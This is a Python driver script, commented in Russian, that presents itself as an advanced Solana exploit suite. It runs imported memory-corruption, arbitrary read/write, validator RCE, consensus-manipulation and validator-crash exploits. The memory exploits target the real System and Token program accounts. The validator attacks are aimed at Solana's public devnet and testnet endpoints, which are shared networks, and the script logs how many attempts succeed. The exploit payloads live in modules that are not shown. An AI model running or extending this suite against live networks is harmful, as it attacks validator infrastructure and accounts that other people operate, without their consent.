#!/usr/bin/env python3
"""
ПРОДВИНУТЫЙ НАБОР ЭКСПЛОЙТОВ SOLANA
Интеграция всех техник из анализа 155 изображений PDF + новые продвинутые эксплойты

Основано на:
- Полном анализе PDF "Pwning Blockchain for Fun and Profit" (155 изображений)
- 8 категорий критических эксплойтов
- Memory corruption и validator RCE техники
- CPI interoperability и guest address validation
"""

import asyncio
import logging
import time
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
import json

from solders.keypair import Keypair
from solders.pubkey import Pubkey as PublicKey
from solana.rpc.async_api import AsyncClient

# Импорт всех наших эксплойтов
from src.exploits import (
    # Базовые классы
    BaseExploit, ExploitResult, ExploitStatus, ExploitType,
    
    # Основные эксплойты
    AccountExploit, TokenExploit, ProgramExploit, ReentrancyExploit,
    
    # Продвинутые эксплойты из PDF
    MemoryExploit, MemoryVulnerability, MemoryExploitConfig,
    ValidatorExploit, ValidatorVulnerability, ValidatorExploitConfig,
    
    # Менеджер
    ExploitManager
)

# Импорт наших специализированных модулей из PDF анализа
import sys
sys.path.append(str(Path(__file__).parent / "src" / "exploits"))
from complete_pdf_exploits import CompletePDFExploitFramework
from memory_region_exploits import MemoryRegionExploitFramework

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class AdvancedExploitSuite:
    """
    Продвинутый набор эксплойтов, объединяющий:
    1. Все техники из 155 изображений PDF
    2. Memory corruption эксплойты
    3. Validator RCE эксплойты
    4. CPI interoperability эксплойты
    5. Guest address validation bypass
    """
    
    def __init__(self, rpc_endpoint: str = "https://api.devnet.solana.com"):
        self.client = AsyncClient(rpc_endpoint)
        self.attacker_keypair = Keypair()
        self.exploit_manager = ExploitManager(self.client, self.attacker_keypair)
        
        # Специализированные фреймворки из PDF анализа
        self.pdf_framework = CompletePDFExploitFramework()
        self.memory_framework = MemoryRegionExploitFramework()
        
        # Продвинутые эксплойты
        self.memory_exploit = MemoryExploit(self.client, self.attacker_keypair)
        self.validator_exploit = ValidatorExploit(self.client, self.attacker_keypair)
        
        # Статистика
        self.total_exploits_run = 0
        self.successful_exploits = 0
        self.failed_exploits = 0
        
        logger.info(f"[+] Инициализирован AdvancedExploitSuite")
        logger.info(f"    Attacker pubkey: {self.attacker_keypair.pubkey()}")
        logger.info(f"    RPC endpoint: {rpc_endpoint}")

    async def run_pdf_critical_exploits(self) -> Dict[str, Any]:
        """
        Запуск критических эксплойтов из анализа 155 изображений PDF
        35 критических изображений -> 3 основных эксплойта
        """
        logger.info("[!] ЗАПУСК КРИТИЧЕСКИХ ЭКСПЛОЙТОВ ИЗ PDF (35 изображений)")
        
        start_time = time.time()
        results = {}
        
        try:
            # 1. Arbitrary Read/Write (0xdeadbeaf) - страницы 157-159, 291KB
            logger.info("[1/3] Arbitrary Read/Write (0xdeadbeaf)...")
            target_account = self.attacker_keypair.pubkey()
            critical_results = self.pdf_framework.run_critical_exploit_chain(target_account)
            
            results["critical_exploits"] = {
                "total": len(critical_results),
                "successful": sum(1 for r in critical_results if r.success),
                "results": [
                    {
                        "type": r.exploit_type,
                        "success": r.success,
                        "execution_time": r.execution_time,
                        "target": str(r.target_address) if r.target_address else None,
                        "leaked_data_size": len(r.leaked_data) if r.leaked_data else 0
                    }
                    for r in critical_results
                ]
            }
            
            self.total_exploits_run += len(critical_results)
            self.successful_exploits += results["critical_exploits"]["successful"]
            
            logger.info(f"[=] Критические эксплойты: {results['critical_exploits']['successful']}/{results['critical_exploits']['total']} успешно")
            
        except Exception as e:
            logger.error(f"[-] Ошибка в критических эксплойтах: {e}")
            results["critical_exploits"] = {"error": str(e)}
        
        results["execution_time"] = time.time() - start_time
        return results

    async def run_memory_region_exploits(self) -> Dict[str, Any]:
        """
        Запуск Memory Region эксплойтов из анализа PDF
        29 изображений среднего приоритета -> 3 memory region техники
        """
        logger.info("[*] ЗАПУСК MEMORY REGION ЭКСПЛОЙТОВ (29 изображений)")
        
        start_time = time.time()
        results = {}
        
        try:
            # Memory Region эксплойты из страниц 70-79, 101-107, 147-151
            memory_results = self.memory_framework.run_comprehensive_memory_exploits()
            
            results["memory_region"] = {
                "total": memory_results["total_exploits"],
                "successful": memory_results["successful_exploits"],
                "execution_time": memory_results["total_execution_time"],
                "exploits": memory_results["exploit_results"]
            }
            
            self.total_exploits_run += memory_results["total_exploits"]
            self.successful_exploits += memory_results["successful_exploits"]
            
            logger.info(f"[=] Memory Region: {memory_results['successful_exploits']}/{memory_results['total_exploits']} успешно")
            
        except Exception as e:
            logger.error(f"[-] Ошибка в memory region эксплойтах: {e}")
            results["memory_region"] = {"error": str(e)}
        
        results["execution_time"] = time.time() - start_time
        return results

    async def run_advanced_memory_exploits(self, target_accounts: List[PublicKey]) -> Dict[str, Any]:
        """
        Запуск продвинутых memory corruption эксплойтов
        Основано на техниках Cell<u64> manipulation, arbitrary read/write
        """
        logger.info("[*] ЗАПУСК ПРОДВИНУТЫХ MEMORY CORRUPTION ЭКСПЛОЙТОВ")
        
        start_time = time.time()
        results = {}
        
        try:
            # Комплексное сканирование memory уязвимостей
            scan_results = await self.memory_exploit.run_comprehensive_memory_scan(target_accounts)
            
            memory_exploits_run = 0
            memory_exploits_successful = 0
            
            for account, vulnerabilities in scan_results.items():
                if vulnerabilities:
                    logger.info(f"[+] Найдены уязвимости в {account}: {len(vulnerabilities)}")
                    
                    for vuln in vulnerabilities:
                        # Создаем конфигурацию для эксплойта
                        config = MemoryExploitConfig(
                            target_account=PublicKey.from_string(account),
                            vulnerability_type=vuln,
                            target_offset=0,
                            payload_size=8 if vuln == MemoryVulnerability.CELL_MANIPULATION else 64
                        )
                        
                        # Выполняем соответствующий эксплойт
                        if vuln == MemoryVulnerability.ARBITRARY_READ_WRITE:
                            exploit_result = await self.memory_exploit.exploit_arbitrary_readwrite(config)
                        elif vuln == MemoryVulnerability.MEMORY_REGION_BYPASS:
                            exploit_result = await self.memory_exploit.exploit_memory_region_bypass(config)
                        elif vuln == MemoryVulnerability.CELL_MANIPULATION:
                            exploit_result = await self.memory_exploit.exploit_cell_manipulation(config)
                        else:
                            continue
                        
                        memory_exploits_run += 1
                        if exploit_result.status == ExploitStatus.SUCCESS:
                            memory_exploits_successful += 1
                            logger.info(f"[+] {vuln.value} эксплойт успешен для {account}")
                        else:
                            logger.warning(f"[-] {vuln.value} эксплойт неудачен для {account}")
            
            results["advanced_memory"] = {
                "accounts_scanned": len(target_accounts),
                "vulnerabilities_found": sum(len(v) for v in scan_results.values()),
                "exploits_run": memory_exploits_run,
                "exploits_successful": memory_exploits_successful,
                "scan_results": scan_results
            }
            
            self.total_exploits_run += memory_exploits_run
            self.successful_exploits += memory_exploits_successful
            
            logger.info(f"[=] Продвинутые memory: {memory_exploits_successful}/{memory_exploits_run} успешно")
            
        except Exception as e:
            logger.error(f"[-] Ошибка в продвинутых memory эксплойтах: {e}")
            results["advanced_memory"] = {"error": str(e)}
        
        results["execution_time"] = time.time() - start_time
        return results

    async def run_validator_exploits(self, validator_endpoints: List[str]) -> Dict[str, Any]:
        """
        Запуск validator RCE эксплойтов
        Основано на исследовании RCE уязвимостей в Solana validator
        """
        logger.info("[!] ЗАПУСК VALIDATOR RCE ЭКСПЛОЙТОВ")
        
        start_time = time.time()
        results = {}
        
        try:
            # Комплексное сканирование validator уязвимостей
            scan_results = await self.validator_exploit.run_comprehensive_validator_scan(validator_endpoints)
            
            validator_exploits_run = 0
            validator_exploits_successful = 0
            
            for endpoint, vulnerabilities in scan_results.items():
                if vulnerabilities:
                    logger.info(f"[+] Найдены уязвимости в validator {endpoint}: {len(vulnerabilities)}")
                    
                    for vuln in vulnerabilities:
                        # Создаем конфигурацию для validator эксплойта
                        config = ValidatorExploitConfig(
                            target_validator=endpoint,
                            vulnerability_type=vuln,
                            rpc_endpoint=endpoint
                        )
                        
                        # Выполняем соответствующий эксплойт
                        if vuln == ValidatorVulnerability.RCE_VULNERABILITY:
                            exploit_result = await self.validator_exploit.exploit_rce_vulnerability(config)
                        elif vuln == ValidatorVulnerability.CONSENSUS_MANIPULATION:
                            exploit_result = await self.validator_exploit.exploit_consensus_manipulation(config)
                        elif vuln == ValidatorVulnerability.VALIDATOR_CRASH:
                            exploit_result = await self.validator_exploit.exploit_validator_crash(config)
                        else:
                            continue
                        
                        validator_exploits_run += 1
                        if exploit_result.status == ExploitStatus.SUCCESS:
                            validator_exploits_successful += 1
                            logger.info(f"[+] {vuln.value} эксплойт успешен для {endpoint}")
                        else:
                            logger.warning(f"[-] {vuln.value} эксплойт неудачен для {endpoint}")
            
            results["validator_exploits"] = {
                "endpoints_scanned": len(validator_endpoints),
                "vulnerabilities_found": sum(len(v) for v in scan_results.values()),
                "exploits_run": validator_exploits_run,
                "exploits_successful": validator_exploits_successful,
                "scan_results": scan_results
            }
            
            self.total_exploits_run += validator_exploits_run
            self.successful_exploits += validator_exploits_successful
            
            logger.info(f"[=] Validator эксплойты: {validator_exploits_successful}/{validator_exploits_run} успешно")
            
        except Exception as e:
            logger.error(f"[-] Ошибка в validator эксплойтах: {e}")
            results["validator_exploits"] = {"error": str(e)}
        
        results["execution_time"] = time.time() - start_time
        return results

    async def run_comprehensive_exploit_suite(self) -> Dict[str, Any]:
        """
        Запуск полного набора эксплойтов:
        1. Критические эксплойты из PDF (35 изображений)
        2. Memory Region эксплойты (29 изображений)  
        3. Продвинутые memory corruption
        4. Validator RCE эксплойты
        """
        logger.info("=" * 80)
        logger.info("[!] ЗАПУСК ПОЛНОГО НАБОРА ПРОДВИНУТЫХ ЭКСПЛОЙТОВ")
        logger.info("    Основано на анализе 155 изображений PDF + новые техники")
        logger.info("=" * 80)
        
        suite_start_time = time.time()
        comprehensive_results = {}
        
        # 1. Критические эксплойты из PDF
        pdf_results = await self.run_pdf_critical_exploits()
        comprehensive_results["pdf_critical"] = pdf_results
        
        # 2. Memory Region эксплойты
        memory_region_results = await self.run_memory_region_exploits()
        comprehensive_results["memory_region"] = memory_region_results
        
        # 3. Продвинутые memory corruption эксплойты
        test_accounts = [
            PublicKey.from_string("11111111111111111111111111111112"),  # System Program
            PublicKey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),  # Token Program
            self.attacker_keypair.pubkey()  # Наш тестовый аккаунт
        ]
        
        advanced_memory_results = await self.run_advanced_memory_exploits(test_accounts)
        comprehensive_results["advanced_memory"] = advanced_memory_results
        
        # 4. Validator RCE эксплойты (только devnet для безопасности)
        validator_endpoints = [
            "https://api.devnet.solana.com",
            "https://api.testnet.solana.com"
        ]
        
        validator_results = await self.run_validator_exploits(validator_endpoints)
        comprehensive_results["validator_rce"] = validator_results
        
        # Финальная статистика
        total_time = time.time() - suite_start_time
        success_rate = (self.successful_exploits / self.total_exploits_run * 100) if self.total_exploits_run > 0 else 0
        
        comprehensive_results["final_stats"] = {
            "total_exploits_run": self.total_exploits_run,
            "successful_exploits": self.successful_exploits,
            "failed_exploits": self.failed_exploits,
            "success_rate": success_rate,
            "total_execution_time": total_time
        }
        
        logger.info("=" * 80)
        logger.info("[=] ФИНАЛЬНАЯ СТАТИСТИКА ПРОДВИНУТОГО НАБОРА ЭКСПЛОЙТОВ")
        logger.info(f"[+] Всего эксплойтов запущено: {self.total_exploits_run}")
        logger.info(f"[+] Успешных эксплойтов: {self.successful_exploits}")
        logger.info(f"[%] Процент успеха: {success_rate:.1f}%")
        logger.info(f"[T] Общее время выполнения: {total_time:.2f}s")
        logger.info("=" * 80)
        
        return comprehensive_results

    async def save_results_report(self, results: Dict[str, Any], filename: str = "advanced_exploit_report.json"):
        """Сохранение детального отчета о результатах"""
        report_path = Path(__file__).parent / filename
        
        # Добавляем метаданные
        report = {
            "metadata": {
                "timestamp": time.time(),
                "attacker_pubkey": str(self.attacker_keypair.pubkey()),
                "pdf_analysis_base": "155 изображений из 'Pwning Blockchain for Fun and Profit'",
                "exploit_categories": 8,
                "framework_version": "1.0.0"
            },
            "results": results
        }
        
        with open(report_path, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False, default=str)
        
        logger.info(f"[+] Отчет сохранен: {report_path}")

async def main():
    """Главная функция для запуска продвинутого набора эксплойтов"""
    print("[!] ЗАПУСК ПРОДВИНУТОГО НАБОРА SOLANA ЭКСПЛОЙТОВ")
    print("    Основано на полном анализе 155 изображений PDF")
    print("    + Memory corruption + Validator RCE техники")
    print()
    
    # Инициализация набора эксплойтов
    exploit_suite = AdvancedExploitSuite()
    
    try:
        # Запуск полного набора эксплойтов
        results = await exploit_suite.run_comprehensive_exploit_suite()
        
        # Сохранение отчета
        await exploit_suite.save_results_report(results)
        
        print("\n[+] Продвинутый набор эксплойтов завершен успешно!")
        print(f"[+] Результаты сохранены в advanced_exploit_report.json")
        
    except Exception as e:
        logger.error(f"[-] Критическая ошибка в продвинутом наборе эксплойтов: {e}")
        raise
    
    finally:
        await exploit_suite.client.close()

if __name__ == "__main__":
    asyncio.run(main())
